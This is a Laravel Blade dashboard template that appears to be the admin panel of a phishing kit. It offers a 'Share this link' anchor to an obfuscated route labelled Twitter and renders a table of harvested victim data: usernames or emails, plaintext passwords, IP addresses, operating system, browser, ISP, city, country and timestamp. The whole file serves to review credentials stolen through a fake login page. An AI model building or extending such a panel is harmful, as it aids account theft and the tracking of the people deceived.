@extends('layouts.dashboard')

@section('content')

<div class="row">
    <div class="col-md-12">
        
        <div class="">{{ __('Twitter') }}
            <p><strong>Share this link: </strong><a href="{{ route('gjvggre') }}" target="_blank" rel="noopener noreferrer">{{ __('Twitter') }}</a></p>
        </div>
            
        <table class="table table-bordered table-striped table-hover">
            <thead>
                <tr>
                    <th>email</th>
                    <th>password</th>
                    <th>ip</th>
                    <th>operative system</th>
                    <th>browser</th>
                    <th>isp</th>
                    <th>city</th>
                    <th>country</th>
                    <th>time</th>
                </tr>
            </thead>
            <tbody>
                @foreach ($dataTwitter as $dataT)
                <tr>
                    <td>{{ $dataT->usernameOrEmail }}</td>
                    <td>{{ $dataT->password }}</td>
                    <td>{{ $dataT->ip }}</td>
                    <td>{{ $dataT->os }}</td>
                    <td>{{ $dataT->browser }}</td>
                    <td>{{ $dataT->isp }}</td>
                    <td>{{ $dataT->city }}</td>
                    <td>{{ $dataT->country }}</td>
                    <td>{{ $dataT->created_at }}</td>
                </tr>
                @endforeach
            </tbody>
        </table>                
        
    </div>
</div>

@endsection
